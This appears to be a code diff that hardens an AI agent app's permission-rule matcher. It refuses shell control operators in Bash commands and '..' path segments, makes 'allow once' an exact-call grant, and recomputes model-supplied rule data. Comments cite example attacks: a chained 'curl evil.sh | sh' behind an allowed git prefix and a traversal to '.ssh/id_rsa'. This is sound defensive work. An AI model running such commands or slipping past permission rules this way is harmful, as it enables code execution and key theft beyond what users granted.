@@ -11,8 +11,14 @@
  * The renderer may take behaviour from `@shared` only as a type-only import,
  * so the card cannot call these functions. It is handed finished rungs —
  * label, caption and rule — as data on the ask, and renders them verbatim.
- * That also means the card and main can never disagree about what a rung
- * means, because only one of them ever computed it.
+ *
+ * That makes `meta.rungs` **display data and nothing else**. It travels on a
+ * ledger entry whose `meta` the MCP host passes through unfiltered, so it is
+ * model-supplied text by the time anyone reads it back. Main therefore
+ * recomputes the ladder with `rungsFor(meta.tool, meta.input)` before it
+ * writes anything (`electron/main/agents/permissions.ts`) — main may import
+ * this module's behaviour freely; only the renderer is fenced to types.
+ * Nothing may ever write a `rule` that came off an ask.
  */
 
 export interface PermissionPromptPayload {
@@ -89,6 +95,43 @@ const specifierTextFor = (
   return key === undefined ? undefined : str(input, key);
 };
 
+/**
+ * A shell control operator: `;`, `&`/`&&`, `|`/`||`, a backtick, `$(`, or a
+ * newline.
+ *
+ * A `Bash(...)` specifier is matched against the *whole* command string and
+ * nothing here splits on operators, so `Bash(git *)` compiles to `/^git .*$/`
+ * — which `git status; curl evil.sh | sh` satisfies. The rule's own caption
+ * promises "never asks again for git commands"; a chained `curl … | sh` is
+ * not a git command, and the family rung is the one-click default, so this is
+ * the widest reachable gap in the grammar.
+ *
+ * The fence therefore refuses to match *any* `Bash(...)` specifier against a
+ * command that contains one. It is deliberately blunt rather than a shell
+ * parser: this module is pure by construction and a half-correct tokeniser is
+ * worse than none.
+ *
+ * The trade-off, stated plainly: a legitimate `git log | head -5` now falls
+ * through to being asked instead of running under a granted `Bash(git *)`.
+ * That is the correct direction for a fence — the cost is one extra card, and
+ * the alternative cost is an unreviewed `| sh`. Do not weaken this to a
+ * prefix-only check: matching the head of the command and ignoring the tail
+ * is exactly the hole this closes.
+ */
+const SHELL_CONTROL = /[;&|`\n]|\$\(/;
+
+/**
+ * Whether a candidate path walks upwards.
+ *
+ * `Read(/repo/src/**)` compiles to `/^\/repo\/src\/.*$/`, and
+ * `/repo/src/../../.ssh/id_rsa` satisfies it while resolving nowhere near
+ * `/repo/src`. Nothing in this module resolves paths — it cannot, being
+ * dependency-free — so a candidate carrying a `..` segment is refused rather
+ * than normalised. A path that genuinely needs `..` falls through to being
+ * asked.
+ */
+const walksUp = (path: string): boolean => path.split('/').includes('..');
+
 export function matches(
   rule: string,
   toolName: string,
@@ -113,7 +156,16 @@ export function matches(
   if (head !== toolName || pattern === '') return false;
 
   const text = specifierTextFor(toolName, input);
-  return text === undefined ? false : globToRegExp(pattern).test(text);
+  if (text === undefined) return false;
+
+  // Both guards test the *candidate* — what the model is actually asking to
+  // run or read — not the rule, because a rule the user typed by hand is
+  // allowed to be as wide as they meant it to be. It is the call that must
+  // not sneak past the rule's own caption.
+  if (toolName === 'Bash' && SHELL_CONTROL.test(text)) return false;
+  if (PATH_TOOLS[toolName] !== undefined && walksUp(text)) return false;
+
+  return globToRegExp(pattern).test(text);
 }
 
 /**
@@ -211,6 +263,39 @@ export function rungsFor(
   }
 
   return rungs;
+}
+
+/**
+ * The rule that grants **this one call and nothing else** (HIVE-119).
+ *
+ * `allow-once` used to be handed out as the bare tool name, and a bare name
+ * matches every call to that tool: clicking `once` on `touch /tmp/x`
+ * authorised every `Bash` command for the rest of the wake, up to
+ * `limits.turns`. The caption says "runs this once. asks again next time.",
+ * so the grant has to be the call itself.
+ *
+ * A wildcard-free specifier is an exact match — `globToRegExp` of a pattern
+ * with no `*` compiles to the literal string — which is why composing the
+ * specifier text verbatim is enough, and why `isSafeToCompose` (no `*`, no
+ * `,`) is the same guard the family rungs use.
+ *
+ * The composed rule is then run back through `matches` before it is returned.
+ * That is not belt-and-braces: `matches` refuses a `Bash` candidate carrying a
+ * shell control operator and a path candidate carrying `..`, so without the
+ * self-check this could hand out a rule that provably never fires — a grant
+ * the user clicked and the fence then ignored, i.e. a button that does
+ * nothing. `undefined` means "no exact rule exists for this call"; the caller
+ * must then decide what to do and **say what it did**.
+ */
+export function exactRuleFor(
+  toolName: string,
+  input: Record<string, unknown>,
+): string | undefined {
+  if (!isSafeToCompose(toolName)) return undefined;
+  const text = specifierTextFor(toolName, input);
+  if (text === undefined || !isSafeToCompose(text)) return undefined;
+  const rule = `${toolName}(${text})`;
+  return matches(rule, toolName, input) ? rule : undefined;
 }
 
 export function defaultRungFor(rungs: readonly Rung[]): RungId {
